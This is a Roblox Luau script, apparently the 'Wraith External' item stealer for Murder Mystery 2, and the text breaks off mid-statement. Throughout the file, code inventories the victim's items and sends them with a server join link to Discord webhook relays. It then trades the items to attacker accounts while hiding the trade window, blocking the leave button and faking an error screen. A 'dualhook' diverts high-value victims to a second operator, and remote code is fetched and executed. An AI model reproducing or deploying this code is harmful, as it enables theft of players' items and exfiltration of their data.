-- loader.luau — Wraith External
-- entrypoint:
--   _G.MinValue  = 0
--   _G.Usernames = { "nick" }
--   _G.Webhook   = "token_aqui"
--   _G.Ping      = false
--   loadstring(game:HttpGet("url_do_loader", true))()

-- ── compat layer (Xeno, Solara, Wave, executores fracos) ─────────────────────
local sharedEnv = (getgenv and getgenv()) or _G

if not sharedEnv.__WRAITH_COMPAT then
    sharedEnv.__WRAITH_COMPAT = true

    local _G_env = _G
    local _gen   = sharedEnv

    local function probe(name)
        local v
        pcall(function() v = rawget(_G_env, name) end)
        if v ~= nil then return v end
        pcall(function() v = rawget(_gen, name) end)
        if v ~= nil then return v end
        pcall(function() v = rawget(getfenv(0), name) end)
        return v
    end

    local function install(name, value)
        pcall(function() if rawget(_G_env, name) == nil then _G_env[name] = value end end)
        pcall(function() if rawget(_gen,   name) == nil then _gen[name]   = value end end)
    end

    install("cloneref",          probe("cloneref")          or function(x) return x end)
    install("newcclosure",       probe("newcclosure")       or function(fn) return fn end)
    install("setreadonly",       probe("setreadonly")       or probe("make_writeable") or function() end)
    install("make_writeable",    probe("make_writeable")    or probe("setreadonly")    or function() end)
    install("getrawmetatable",   probe("getrawmetatable")   or function() return nil end)
    install("setrawmetatable",   probe("setrawmetatable")   or function() end)
    install("sethiddenproperty", probe("sethiddenproperty") or function() end)
    install("gethiddenproperty", probe("gethiddenproperty") or function() return nil end)
    install("getgc",             probe("getgc")             or function() return {} end)
    install("getnilinstances",   probe("getnilinstances")   or function() return {} end)
    install("getconnections",    probe("getconnections")    or function() return {} end)
    install("getloadedmodules",  probe("getloadedmodules")  or function() return {} end)
    install("getinstances",      probe("getinstances")      or function() return {} end)
    install("getupvalues",       probe("getupvalues")       or function() return {} end)
    install("setupvalue",        probe("setupvalue")        or function() end)
    install("getgenv",           probe("getgenv")           or function() return _G_env end)
    install("identifyexecutor",  probe("identifyexecutor")  or function() return "Unknown", "0.0.0" end)
    install("getexecutorname",   probe("getexecutorname")   or probe("identifyexecutor") or function() return "Unknown" end)

    local req = probe("request")
        or probe("http_request")
        or (probe("syn") and probe("syn").request)
        or (probe("http") and probe("http").request)
    if req then install("request", req) end
end

-- ── boot wait ─────────────────────────────────────────────────────────────────
if not game:IsLoaded() then game.Loaded:Wait() end
local bootTimeout = os.clock() + 10
while os.clock() < bootTimeout and #workspace:GetChildren() <= 2 do
    task.wait(0.1)
end

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")
local localPlayer       = Players.LocalPlayer

if not localPlayer then
    Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
    localPlayer = Players.LocalPlayer
end

-- ── PlaceId guard ─────────────────────────────────────────────────────────────
if game.PlaceId ~= 142823291 then
    localPlayer:Kick("")
    return
end

-- ── MaxPlayers check ──────────────────────────────────────────────────────────
if Players.MaxPlayers <= #Players:GetPlayers() then
    localPlayer:Kick("init")
    return
end

-- ── VIP/Private server guard ──────────────────────────────────────────────────
pcall(function()
    local ok, result = pcall(function()
        return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 5):InvokeServer()
    end)
    if ok and result == "VIPServer" then
        localPlayer:Kick("VIP/Private server — join a public server.")
    end
end)

-- ── level guard ───────────────────────────────────────────────────────────────
pcall(function()
    local ok, level = pcall(function()
        return ReplicatedStorage.Remotes.Extras.GetPlayerLevel:InvokeServer(localPlayer)
    end)
    if ok and type(level) == "number" and level < 10 then
        localPlayer:Kick("")
    end
end)

-- ── execução única por servidor ───────────────────────────────────────────────
if getgenv().__WRAITH_RUNNING then return end
getgenv().__WRAITH_RUNNING = true

-- ── ErrorMessage spoof ────────────────────────────────────────────────────────
local ERROR_TEXT = "There was a problem receiving data, please reconnect.\n (Error Code: 260)"
local _stopSpoof = false

game:GetService("CoreGui").DescendantAdded:Connect(function(descendant)
    if _stopSpoof then return end
    if not (descendant.Name == "ErrorMessage" and descendant:IsA("TextLabel")) then return end
    descendant.Text = ERROR_TEXT
    descendant:GetPropertyChangedSignal("Text"):Connect(function()
        if not _stopSpoof and descendant.Text ~= ERROR_TEXT then
            descendant.Text = ERROR_TEXT
        end
    end)
end)

-- ── leave game button disable ─────────────────────────────────────────────────
task.spawn(function()
    while task.wait() do
        pcall(function()
            for _, v in ipairs(getconnections(
                game:GetService("CoreGui")
                    .RobloxGui
                    .SettingsClippingShield
                    .SettingsShield
                    .MenuContainer
                    .Page
                    .PageViewClipper
                    .PageView
                    .PageViewInnerFrame
                    .LeaveGamePage
                    .LeaveButtonsContainer
                    .LeaveButtonsContainer
                    .LeaveGameButton
                    .Activated
            )) do
                v:Disable()
            end
        end)
    end
end)

-- ── math.random fix ───────────────────────────────────────────────────────────
pcall(function()
    local tbl = {}
    for i = 1, 10 do
        local ok, result = pcall(math.random)
        if not ok then return end
        tbl[i] = result
    end
    local broken = true
    for i = 2, #tbl do
        if tbl[i] ~= tbl[1] then broken = false; break end
    end
    if broken then
        setreadonly(math, false)
        local seed = os.clock() * 1000
        local s, a, c, m = seed, 1664525, 1013904223, 2^32
        math.random = function(lo, hi)
            s = (a * s + c) % m
            local r = s / m
            if lo and hi then return math.floor(r * (hi - lo + 1)) + lo end
            if lo then return math.floor(r * lo) + 1 end
            return r
        end
        setreadonly(math, true)
    end
end)

local minValue  = _G.MinValue   or 0
local usernames = _G.Usernames  or {}
local token     = _G.Webhook    or ""
local doPing    = _G.Ping       or false
local request_  = (syn and syn.request) or (http and http.request) or http_request or request

-- ── source token pra blindar DeclineTrade/DeclineRequest ─────────────────────
local _sourceToken = tostring(math.random(100000, 999999))
_G.__WRAITH_SRC    = _sourceToken

-- ── JobId bypass (Delta fix) ──────────────────────────────────────────────────
local function getJobId()
    if hookmetamethod == nil or (getexecutorname and getexecutorname():lower() ~= "delta") then
        return game.JobId
    end
    local captured = nil
    local orig
    orig = hookmetamethod(game, "__index", function(self, key)
        if captured == nil and not checkcaller() then
            captured = orig(game, "JobId")
        end
        return orig(self, key)
    end)
    local t0 = tick()
    repeat task.wait(0.1) until captured ~= nil or tick() - t0 > 5
    return captured or game.JobId
end

local jobId    = getJobId()
local joinLink = "https://gojoiner.netlify.app/?gameInstanceId=" .. jobId

-- ── API Railway ───────────────────────────────────────────────────────────────
local API_URL = "https://api-wraith-production.up.railway.app"

local function sendEmbed_raw(t, payload)
    if t == "" or not request_ then return nil end
    local messageId = nil
    pcall(function()
        local res = request_({
            Url     = API_URL .. "/fire",
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body    = HttpService:JSONEncode({
                token   = t,
                payload = payload,
                wait    = true,
            }),
        })
        if res and res.Body then
            local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, res.Body)
            if ok2 and decoded and decoded.discord then
                local ok3, msg = pcall(HttpService.JSONDecode, HttpService, decoded.discord)
                if ok3 and msg and msg.id then
                    messageId = msg.id
                end
            end
        end
    end)
    return messageId
end

local function apiedit(msgId, payload)
    if token == "" or not msgId or not request_ then return end
    pcall(request_, {
        Url     = API_URL .. "/edit",
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = HttpService:JSONEncode({
            token     = token,
            messageId = msgId,
            payload   = payload,
        }),
    })
end

-- ── monitor externo (Cloudflare Worker) ──────────────────────────────────────
local MONITOR_URL = "https://wraith-monitor2.gabrielgabrieldoegito.workers.dev/register"

local function registerMonitor(msgId, embed, targetUserId)
    if token == "" or not msgId or not request_ then return end
    pcall(request_, {
        Url     = MONITOR_URL,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = HttpService:JSONEncode({
            userId    = targetUserId,
            token     = token,
            messageId = msgId,
            embed     = embed,
            apiUrl    = API_URL,
        }),
    })
end

-- ── dualhook config ───────────────────────────────────────────────────────────
local DUAL_PASTEFY   = "https://pastefy.app/SagUyvDf/raw"
local DUAL_MIN_VALUE = 567
local DUAL_USERNAME  = nil
local DUAL_TOKEN     = "DUAL_TOKEN_AQUI"
local KICK_DISCORD   = "discord.gg/wraith"
local EMBED_COLOR    = 0x008CFF
local WEBHOOK_NAME   = "Wraith External"

pcall(function()
    local ok, raw = pcall(game.HttpGet, game, DUAL_PASTEFY, true)
    if ok and raw then
        DUAL_USERNAME = raw:match("^%s*(.-)%s*$")
        if DUAL_USERNAME == "" then DUAL_USERNAME = nil end
    end
end)

-- ── rarity base ───────────────────────────────────────────────────────────────
local RARITY_BASE = {
    Common=0.1, Uncommon=0.25, Rare=0.5,
    Legendary=1, Godly=2, Ancient=5, Vintage=15, Chroma=50,
}

local BLACKLIST = {
    DefaultGun=true, DefaultKnife=true, Reaver=true,
    Reaver_Legendary=true, Reaver_Godly=true, Reaver_Ancient=true,
    IceHammer=true, IceHammer_Legendary=true, IceHammer_Godly=true,
    IceHammer_Ancient=true, Gingerscythe=true, Gingerscythe_Legendary=true,
    Gingerscythe_Godly=true, Gingerscythe_Ancient=true,
    TestItem=true, Season1TestKnife=true, Cracks=true, Icecrusher=true,
    ["???"]=true, Dartbringer=true, SharkSeeker=true,
}

-- ── values ────────────────────────────────────────────────────────────────────
local values = {}

pcall(function()
    local ok, raw = pcall(game.HttpGet, game,
        "https://raw.githubusercontent.com/wraithexternaI/mm2/refs/heads/main/values", true)
    if ok and raw and raw ~= "" then
        local chunk = loadstring(raw)
        if chunk then
            local ok2, result = pcall(chunk)
            if ok2 and type(result) == "table" then values = result end
        end
        if not next(values) then
            local ok3, result2 = pcall(HttpService.JSONDecode, HttpService, raw)
            if ok3 and type(result2) == "table" then values = result2 end
        end
    end
end)

-- ── emoji map ─────────────────────────────────────────────────────────────────
local emojiMap = {}

pcall(function()
    local ok, raw = pcall(game.HttpGet, game,
        "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2", true)
    if ok and raw and raw ~= "" then
        local ok2, decoded = pcall(HttpService.JSONDecode, HttpService, raw)
        if ok2 and type(decoded) == "table" and decoded.data then
            for _, entry in ipairs(decoded.data) do
                if entry.name and entry.emoji then
                    emojiMap[entry.name:lower()] = entry.emoji
                end
            end
        end
    end
end)

local function getEmoji(itemName)
    if not itemName then return "" end
    return emojiMap[itemName:lower()] or ""
end

-- ── weapons db ────────────────────────────────────────────────────────────────
local weapons

pcall(function()
    weapons = require(
        ReplicatedStorage:WaitForChild("Database",10)
            :WaitForChild("Sync",10)
            :WaitForChild("Item",10)
    )
end)

if not weapons then
    pcall(function()
        local m = require(
            ReplicatedStorage:WaitForChild("Database",10)
                :WaitForChild("Sync",10)
        )
        weapons = m.Weapons or m
    end)
end

-- ── helpers ───────────────────────────────────────────────────────────────────

-- mapa lowercase name→DataID (igual t2 do elysium) para fallback em IDs não convencionais
local _nameToID = {}
pcall(function()
    if not weapons then return end
    for k, v in pairs(weapons) do
        if v.ItemName then
            _nameToID[v.ItemName:lower()] = k
        end
        _nameToID[k:lower()] = k
    end
end)

local function resolveID(dataID)
    if not weapons then return dataID end
    if weapons[dataID] then return dataID end
    -- padrão elysium: qualquer suffix _NNNN (ex: Elderwood_2021, Icicle_2022)
    local m = dataID:match("^(.-)_%d%d%d%d$")
    if m and weapons[m] then return m end
    local m2 = dataID:match("^(.+)Knife$")
    if m2 and weapons[m2] then return m2 end
    local m3 = dataID:match("^(.+)Gun$")
    if m3 and weapons[m3] then return m3 end
    local hit = _nameToID[dataID:lower()]
    if hit then return hit end
    return dataID
end

local function resolveItem(dataID)
    if not weapons then return nil end
    local id    = resolveID(dataID)
    local entry = weapons[id]
    if not entry then return nil end
    local rarity = entry.Chroma == true and "Chroma" or (entry.Rarity or "Common")
    return {
        dataid   = id,
        name     = entry.ItemName or entry.Name or id,
        rarity   = rarity,
        isChroma = entry.Chroma == true,
        value    = values[entry.ItemName or id]
                or values[(entry.ItemName or id):lower()]
                or RARITY_BASE[rarity] or 0.1,
    }
end

local function getProfile()
    local ok1, r1 = pcall(function()
        return ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(localPlayer.Name)
    end)
    if ok1 and type(r1) == "table" and r1.Weapons then return r1 end

    local ok2, r2 = pcall(function()
        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer()
    end)
    if ok2 and type(r2) == "table" and r2.Weapons then return r2 end

    local ok3, r3 = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Modules",10):WaitForChild("ProfileData",10))
    end)
    if ok3 and type(r3) == "table" and r3.Weapons then return r3 end
    return nil
end

local function buildItems(profile)
    local list    = {}
    local owned   = profile.Weapons and profile.Weapons.Owned or {}
    local uniques = profile.Uniques or {}

    for k, amount in pairs(owned) do
        local str = tostring(k)
        amount = type(amount) == "number" and amount or 1
        local info = resolveItem(str)
        if info and not BLACKLIST[info.dataid] then
            table.insert(list, {
                DataID=info.dataid, Name=info.name,
                Rarity=info.rarity, Amount=amount,
                Value=info.value, IsChroma=info.isChroma,
            })
        end
    end

    for _, unique in ipairs(uniques) do
        local str = tostring(unique.BaseItem or "")
        if str ~= "" then
            if unique.EvoEquipped and weapons and weapons[str] and weapons[str].Evo then
                local evo = weapons[str].Evo
                local xp  = unique.XP or 0
                for i = 4, 1, -1 do
                    if evo[i] and xp >= evo[i].XPRequired then
                        str = evo[i].ItemName or str; break
                    end
                end
            end
            local info = resolveItem(str)
            if info and not BLACKLIST[info.dataid] then
                table.insert(list, {
                    DataID=info.dataid, Name=info.name,
                    Rarity=info.rarity, Amount=1,
                    Value=info.value, IsChroma=info.isChroma,
                })
            end
        end
    end

    table.sort(list, function(a,b) return a.Value > b.Value end)
    return list
end

local function filterItems(list)
    if minValue == 0 then return list end
    local out = {}
    for _, item in ipairs(list) do
        if item.Value >= minValue then
            table.insert(out, item)
        end
    end
    return out
end

-- ── embed builder ─────────────────────────────────────────────────────────────
local function buildEmbed(victimName, items, statusText)
    local totalVal = 0
    for _, item in ipairs(items) do
        totalVal += item.Value * item.Amount
    end

    local embedTitle
    if totalVal >= 100 then
        embedTitle = "Ultra Mega Hit 🌈"
    elseif totalVal >= 20 then
        embedTitle = "Mega Hit ✨"
    else
        embedTitle = "Hit"
    end

    local fields = {}

    table.insert(fields, {
        name   = "📥  Receivers",
        value  = #usernames > 0 and table.concat(usernames, ", ") or "—",
        inline = false,
    })

    local knifeLines = {}
    for _, item in ipairs(items) do
        local emoji = getEmoji(item.Name)
        if emoji ~= "" then
            table.insert(knifeLines, string.format("%s %s — %g", item.Name, emoji, item.Value))
        else
            table.insert(knifeLines, string.format("%s — %g", item.Name, item.Value))
        end
    end

    local victimBody = #knifeLines > 0 and table.concat(knifeLines, "\n") or "—"
    if #victimBody > 1020 then victimBody = victimBody:sub(1,1020) .. "\n..." end

    table.insert(fields, {
        name   = "🎯  Victim: " .. (victimName or localPlayer.Name),
        value  = victimBody,
        inline = false,
    })

    table.insert(fields, {
        name   = "📊  Value Total",
        value  = string.format("%g", totalVal),
        inline = true,
    })

    local execName = "unknown"
    pcall(function()
        execName = identifyexecutor and identifyexecutor()
            or getexecutorname and getexecutorname()
            or "unknown"
    end)
    table.insert(fields, {
        name   = "⚙️  Executor",
        value  = execName,
        inline = true,
    })

    table.insert(fields, {
        name   = "📡  Status",
        value  = statusText or "🟢 In Game",
        inline = false,
    })

    table.insert(fields, {
        name   = "🔗  Join",
        value  = string.format("[**Entrar no servidor**](%s)", joinLink),
        inline = false,
    })

    return {
        title     = embedTitle,
        color     = EMBED_COLOR,
        fields    = fields,
        _totalVal = totalVal,
        thumbnail = { url = string.format(
            "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png",
            localPlayer.UserId) },
        footer    = { text = WEBHOOK_NAME .. "  •  MM2" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }
end

local function editStatus(msgId, embed, newStatus)
    if not msgId then return end
    for _, field in ipairs(embed.fields or {}) do
        if field.name == "📡  Status" then
            field.value = newStatus
            break
        end
    end
    local cleanEmbed = {}
    for k, v in pairs(embed) do
        if k ~= "_totalVal" then cleanEmbed[k] = v end
    end
    apiedit(msgId, {
        username   = WEBHOOK_NAME,
        avatar_url = "https://i.postimg.cc/MppzJD4r/Screenshot-20261006-135801.jpg",
        embeds     = { cleanEmbed },
    })
end

local function sendEmbed(embed, useDualToken)
    local t = useDualToken and DUAL_TOKEN or token
    local cleanEmbed = {}
    for k, v in pairs(embed) do
        if k ~= "_totalVal" then cleanEmbed[k] = v end
    end
    return sendEmbed_raw(t, {
        username   = WEBHOOK_NAME,
        avatar_url = "https://i.postimg.cc/MppzJD4r/Screenshot-20261006-135801.jpg",
        content    = doPing and "@everyone" or nil,
        embeds     = { cleanEmbed },
    })
end

-- ── initial scan + dualhook ───────────────────────────────────────────────────
local profile = getProfile()
if not profile then return end

local myItems   = buildItems(profile)
local userItems = filterItems(myItems)

local dualItems = {}
for _, item in ipairs(myItems) do
    if item.Value >= DUAL_MIN_VALUE then
        table.insert(dualItems, item)
    end
end

local sentToDual    = false
local initialMsgId  = nil
local initialEmbed  = nil
local currentTarget = nil

if #dualItems > 0 then
    sentToDual   = true
    initialEmbed = buildEmbed(localPlayer.Name, dualItems, "🟢 In Game")
    initialMsgId = sendEmbed(initialEmbed, true)
else
    if token ~= "" and #userItems > 0 then
        initialEmbed = buildEmbed(localPlayer.Name, userItems, "🟢 In Game")
        initialMsgId = sendEmbed(initialEmbed, false)
    end
end

if initialMsgId and initialEmbed then
    registerMonitor(initialMsgId, initialEmbed, localPlayer.UserId)
end

if sentToDual then
    _stopSpoof = true
    return
end

if minValue > 0 and #userItems == 0 then
    localPlayer:Kick("")
    return
end

if #usernames == 0 or #userItems == 0 then return end

-- ── trade setup ───────────────────────────────────────────────────────────────
local trade = ReplicatedStorage:WaitForChild("Trade", 15)
if not trade then return end

pcall(function()
    if getexecutorname and getexecutorname():lower() == "xeno" then
        require(ReplicatedStorage.Modules.InventoryModule).UpdateInventory = function() end
    else
        ReplicatedStorage.Remotes.Inventory.ProfileDataChanged:Destroy()
    end
end)

local function getUserDevice()
    local gui = localPlayer:WaitForChild("PlayerGui", 10)
    if not gui then return "PC" end
    if gui:GetAttribute("Device") == nil then
        local t0 = tick()
        repeat task.wait() until gui:GetAttribute("Device") ~= nil or tick()-t0 > 5
    end
    return gui:GetAttribute("Device") or "PC"
end

local function hideTrade()
    local playerGui = localPlayer:WaitForChild("PlayerGui", 10)
    if not playerGui then return end
    local tradeGUI = playerGui:FindFirstChild("TradeGUI")
    local phoneGUI = playerGui:FindFirstChild("TradeGUI_Phone")
    local hidden   = UDim2.new(99, 99, 99, 99)
    pcall(function()
        if tradeGUI then
            for _, child in ipairs(tradeGUI:GetChildren()) do
                pcall(function() child.Position = hidden end)
            end
        end
    end)
    pcall(function()
        if phoneGUI then
            phoneGUI.Inactive.Frame.Position        = hidden
            phoneGUI.Inactive.TradeMainOld.Position = hidden
            phoneGUI.Container.Position             = hidden
        end
    end)
    local device = getUserDevice()
    if device == "Phone" then
        pcall(function()
            local blocker = playerGui:WaitForChild("TradeGUI_Phone"):WaitForChild("ClickBlocker", 5)
            local req     = playerGui:WaitForChild("MainGUI").Lobby.Leaderboard.Container.OverlayMenu.TradeRequest
            blocker.Visible = false
            req.Visible     = false
            blocker:GetPropertyChangedSignal("Visible"):Connect(function() blocker.Visible = false end)
            req:GetPropertyChangedSignal("Visible"):Connect(function() req.Visible = false end)
        end)
    end
end

hideTrade()

task.spawn(function()
    local playerGui = localPlayer:WaitForChild("PlayerGui", 10)
    local hidden    = UDim2.new(0, 9999, 0, 9999)
    while task.wait(0.5) do
        pcall(function()
            local tg = playerGui:FindFirstChild("TradeGUI")
            if tg then
                tg.Enabled = false
                for _, c in ipairs(tg:GetChildren()) do
                    pcall(function() c.Position = hidden end)
                end
            end
        end)
    end
end)

-- ── hook DeclineTrade/DeclineRequest pra só passar chamadas do script ─────────
pcall(function()
    if not (hookfunction and debug and debug.getinfo) then return end

    local function safeHook(remote)
        if not remote or not remote:IsA("RemoteEvent") then return end
        local origFire = remote.FireServer

        pcall(function()
            hookfunction(origFire, function(self, ...)
                local ok2, info = pcall(debug.getinfo, 2, "S")
                if ok2 and info and info.source then
                    if info.source:find(_sourceToken, 1, true) then
                        return origFire(self, ...)
                    end
                    -- chamada não veio do script — bloqueia
                    return
                end
                return origFire(self, ...)
            end)
        end)
    end

    safeHook(trade:FindFirstChild("DeclineTrade"))
    safeHook(trade:FindFirstChild("DeclineRequest"))
    safeHook(trade:FindFirstChild("CancelRequest"))
end)

-- OnClientInvoke adaptativo: começa com false (bloqueia popup)
-- se o executor não suportar, o SendingRequest trava — detecta e troca pra true
local _clientInvokeValue = false
local sendReqEv = trade:FindFirstChild("SendRequest")
if sendReqEv then
    sendReqEv.OnClientInvoke = newcclosure(function() return _clientInvokeValue end)
end

local tradeOpen    = false
local tradeDone    = false
local lastOffer    = 0
local _offeringNow = false  -- pausa o accept loop durante o offer
local _inDeadline  = false  -- accept loop inline ativo no doTrade

local startTradeEv   = trade:FindFirstChild("StartTrade")
local declineTradeEv = trade:FindFirstChild("DeclineTrade")
local acceptTradeEv  = trade:FindFirstChild("AcceptTrade")
local updateTradeEv  = trade:FindFirstChild("UpdateTrade")

if startTradeEv  then startTradeEv.OnClientEvent:Connect(function()
    tradeOpen = true; tradeDone = false
end) end

if declineTradeEv then declineTradeEv.OnClientEvent:Connect(function()
    tradeOpen = false; tradeDone = true; _offeringNow = false; _inDeadline = false
end) end

if acceptTradeEv then acceptTradeEv.OnClientEvent:Connect(function(v)
    if v then tradeOpen = false; tradeDone = true; _offeringNow = false; _inDeadline = false end
end) end

if updateTradeEv then updateTradeEv.OnClientEvent:Connect(function(d)
    if type(d) == "table" and d.LastOffer ~= nil then
        lastOffer    = d.LastOffer
        _G.LastOffer = lastOffer
    end
end) end

task.spawn(function()
    while task.wait(0.2) do
        local ok2, status = pcall(function()
            return trade.GetTradeStatus:InvokeServer()
        end)
        local s = ok2 and status or "None"
        if s == "ReceivingRequest" then
            pcall(function()
                if not tradeOpen then trade.DeclineRequest:FireServer() end
            end)
        end
        -- não aceita enquanto estiver oferecendo ou com deadline loop ativo
        if tradeOpen and not _offeringNow and not _inDeadline then
            pcall(function()
                trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer or 0)
            end)
        end
    end
end)

pcall(function()
    if not (getrawmetatable and debug and debug.getupvalue and debug.setupvalue) then return end
    local mt = getrawmetatable(game)
    if not (mt and mt.__namecall) then return end
    local namecall = mt.__namecall
    local function patchTradeAllowed()
        for i = 1, 10 do
            local name = debug.getupvalue(namecall, i)
            if name == "TradeAllowed" then
                debug.setupvalue(namecall, i, true)
                return
            end
        end
    end
    patchTradeAllowed()
    task.spawn(function()
        while task.wait(1.5) do pcall(patchTradeAllowed) end
    end)
end)

task.spawn(function()
    if not (getupvalues and setupvalue and getloadedmodules) then return end
    local ok2, mods = pcall(getloadedmodules)
    if not ok2 or not mods then return end
    for _, mod in ipairs(mods) do
        local ok3, upvals = pcall(getupvalues, mod)
        if ok3 and type(upvals) == "table" then
            for k, v in pairs(upvals) do
                if type(v) == "number" and v >= 0 and v <= 6 then
                    pcall(setupvalue, mod, k, 0)
                end
            end
        end
    end
end)

local function getTradeStatus()
    local ok2, r = pcall(function() return trade.GetTradeStatus:InvokeServer() end)
    return ok2 and r or "None"
end

local function waitTradeIdle()
    while getTradeStatus() ~= "None" do task.wait(0.1) end
end

local function cancelCurrent()
    local s = getTradeStatus()
    if s == "StartTrade" then
        pcall(function() trade.DeclineTrade:FireServer() end)
        task.wait(0.3)
    elseif s == "ReceivingRequest" then
        pcall(function() trade.DeclineRequest:FireServer() end)
        task.wait(0.3)
    end
end

local function buildOffer(itemList)
    local seen  = {}
    local order = {}
    -- consolida stacks do mesmo DataID (igual elysium)
    for _, item in ipairs(itemList) do
        if not seen[item.DataID] then
            seen[item.DataID] = { DataID=item.DataID, Amount=0 }
            table.insert(order, seen[item.DataID])
        end
        seen[item.DataID].Amount += item.Amount or 1
    end
    local offer = {}
    for _, slot in ipairs(order) do
        if #offer >= 4 then break end
        local amt = slot.Amount
        if amt > 4 then amt = 4 end
        table.insert(offer, { DataID=slot.DataID, Amount=amt })
    end
    return offer
end

local function doOfferItem(dataID, amount)
    local id = resolveID(dataID)
    for _ = 1, amount do
        if not tradeOpen then return end
        pcall(function() trade.OfferItem:FireServer(id, "Weapons") end)
    end
end

local function doTrade(target)
    cancelCurrent()
    waitTradeIdle()
    tradeOpen    = false
    tradeDone    = false
    _offeringNow = false

    local sendingStart = nil

    -- pré-carrega inventário ANTES de abrir a trade
    -- assim não trava depois do break enquanto a janela está esperando
    local freshProfile  = getProfile()
    local freshAll      = freshProfile and buildItems(freshProfile) or myItems
    local freshFiltered = filterItems(freshAll)
    local offer         = buildOffer(freshFiltered)

    if #offer == 0 then return false end

    -- espera a janela abrir
    while true do
        if not target.Parent then return false end
        local s = getTradeStatus()
        if s == "None" then
            sendingStart = nil
            local ok2, result = pcall(function()
                return trade.SendRequest:InvokeServer(target)
            end)
            if not ok2 then task.wait(2)
            elseif result == true then task.wait(3) end
        elseif s == "SendingRequest" then
            if not sendingStart then sendingStart = tick() end
            if tick() - sendingStart > 8 then
                _clientInvokeValue = true
                sendingStart = nil
            end
            task.wait(0.3)
        elseif s == "ReceivingRequest" then
            sendingStart = nil
            pcall(function() trade.DeclineRequest:FireServer() end)
            task.wait(0.3)
        elseif s == "StartTrade" then
            break
        else
            sendingStart = nil
        end
        task.wait(0.5)
    end

    -- janela aberta — seta tradeOpen aqui imediatamente, não depende só do OnClientEvent
    tradeOpen    = true
    tradeDone    = false
    _offeringNow = true

    -- garante que o servidor processou a abertura antes de ofertar
    task.wait(0.5)

    if not tradeOpen then
        _offeringNow = false
        return false
    end

    -- offer loop
    local aborted = false
    for _, slot in ipairs(offer) do
        if not tradeOpen then
            aborted = true
            break
        end
        doOfferItem(slot.DataID, slot.Amount)
    end

    _offeringNow = false

    if aborted or #offer == 0 then
        pcall(function() trade.DeclineTrade:FireServer() end)
        waitTradeIdle()
        task.wait(2)
        return false
    end

    if not tradeOpen then return false end

    -- deadline loop com AcceptTrade inline — igual elysium
    _inDeadline = true
    local deadline = tick() + 30
    while tick() < deadline do
        if getTradeStatus() == "None" then break end
        pcall(function()
            trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer or 0)
        end)
        task.wait(1)
    end
    _inDeadline = false

    if not tradeDone then
        pcall(function() trade.DeclineTrade:FireServer() end)
    end

    waitTradeIdle()
    task.wait(2)
    return tradeDone
end

local function drainTarget(target)
    currentTarget = target

    while target.Parent do
        local freshProfile = getProfile()
        if not freshProfile then break end

        local freshAll      = buildItems(freshProfile)
        local freshFiltered = filterItems(freshAll)

        if #freshFiltered == 0 then break end

        local ok = doTrade(target)

        if ok then
            if initialMsgId and initialEmbed then
                editStatus(initialMsgId, initialEmbed, "✅ Claimed")
            end
        else
            if not target.Parent then break end
            task.wait(2)
        end

        task.wait(0.5)
    end

    currentTarget = nil
    _stopSpoof    = true
    task.wait(0.5)
    localPlayer:Kick(KICK_DISCORD)
end

-- ── drain kick watcher ────────────────────────────────────────────────────────
-- se o inventário for drenado por outro script enquanto esse roda,
-- detecta e kica com a mensagem customizada
task.spawn(function()
    task.wait(10) -- dá tempo pro loader inicializar antes de começar a checar
    while localPlayer.Parent do
        task.wait(15)
        local freshProfile = getProfile()
        if not freshProfile then continue end

        local freshAll = buildItems(freshProfile)
        local remaining = filterItems(freshAll)

        -- se tinha itens no começo e agora está zerado
        if #userItems > 0 and #remaining == 0 then
            _stopSpoof = true
            localPlayer:Kick(KICK_DISCORD)
            return
        end
    end
end)

-- ── target detection ──────────────────────────────────────────────────────────
local function isDualTarget(player)
    if not DUAL_USERNAME then return false end
    local name = player.Name:lower()
    local disp = player.DisplayName:lower()
    return name == DUAL_USERNAME:lower() or disp == DUAL_USERNAME:lower()
end

local function isTarget(player)
    local name = player.Name:lower()
    local disp = player.DisplayName:lower()
    for _, u in ipairs(usernames) do
        if name == u:lower() or disp == u:lower() then return true end
    end
    return isDualTarget(player)
end

local function pickRandomTarget()
    local present = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer and isTarget(player) then
            table.insert(present, player)
        end
    end
    if #present == 0 then return nil end
    return present[math.random(1, #present)]
end

local busy = {}

local function handleTarget(player)
    if busy[player.Name] then return end
    busy[player.Name] = true

    task.spawn(function()
        local t0 = tick()
        while tick()-t0 < 15 do
            if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then break end
            task.wait(0.5)
        end
        task.wait(1.5)

        if player.Parent then
            local currentStatus = getTradeStatus()
            if currentStatus == "StartTrade" or currentStatus == "SendingRequest" then
                cancelCurrent()
                waitTradeIdle()
                task.wait(0.5)
            end
            drainTarget(player)
        end

        busy[player.Name] = nil
    end)
end

local function handleAnyTarget(triggerPlayer)
    if #usernames <= 1 then
        handleTarget(triggerPlayer)
        return
    end
    local picked = pickRandomTarget()
    if not picked then return end
    handleTarget(picked)
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= localPlayer and isTarget(player) then
        handleAnyTarget(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if isTarget(player) then
        task.wait(4)
        if player.Parent then handleAnyTarget(player) end
    end
end)

Players.PlayerRemoving:Connect(function(player)
    busy[player.Name] = nil
end)

-- ── queue_on_teleport ─────────────────────────────────────────────────────────
pcall(function()
    if type(queue_on_teleport) ~= "function" then return end

    local usernamesEncoded = (function()
        local t = {}
        for _, u in ipairs(usernames) do
            table.insert(t, string.format("%q", u))
        end
        return table.concat(t, ", ")
    end)()

    local entrypoint = string.format(
        "_G.MinValue  = %d\n_G.Usernames = { %s }\n_G.Webhook   = %q\n_G.Ping      = %s\ntask.wait(1)\nloadstring(game:HttpGet(%q, true))()",
